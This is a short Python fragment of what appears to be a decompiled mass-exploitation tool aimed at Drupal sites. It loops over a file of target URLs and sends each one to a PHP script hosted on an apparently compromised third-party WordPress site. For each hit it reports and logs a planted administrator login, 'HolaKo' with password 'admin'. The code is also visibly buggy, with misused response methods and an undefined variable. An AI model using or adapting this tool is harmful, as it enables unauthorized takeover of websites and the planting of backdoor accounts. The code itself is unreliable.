# Time Succses Parser : Mon Jun  8 17:01:16 2020
# Auto Parser Dis Version : 1.1.0
# Source : https://www.github.com/Datez-Kun
try:
    exp.File = input('\nTarget File (Ex : target.txt) : ')
    exp.Check = open(exp.File, 'r')
    exp.LineR = exp.Check.readlines()
except IOError:
    print("File '%s' not Found" % exp.File)
    exp.Drupal()
else:
    for exp.Compres in exp.LineR:
        exp.Get = exp.Compres.strip()
        try:
            exp.Url = requests.get('http://crig-alda.ro/wp-admin/css/index2.php?url=%s&submit=submit' % exp.Get)
            exp.R = exp.Url.read()
            if 'Success' in exp.Url:
                print(' Success  ---> %s' % exp.Get)
                print(' Username ---> HolaKo | Password ---> admin')
                try:
                    os.mkdir('result')
                except:
                    pass
                else:
                    exp.Create = open('result/Drupal-Exploter/result.txt', 'a')
                    exp.Create.write('[+] %s\n Username ---> HolaKo | Password ---> admin' % exp.Get)
                    exp.Create.close()
            else:
                print(' %s ---> Fail Exploit 404' % exp.Compress)
        except (KeyboardInterrupt, EOFError):
            Exit()
        except Exception as Ro:
            try:
                print('%s' % Ro)
            finally:
                Ro = None
                del Ro
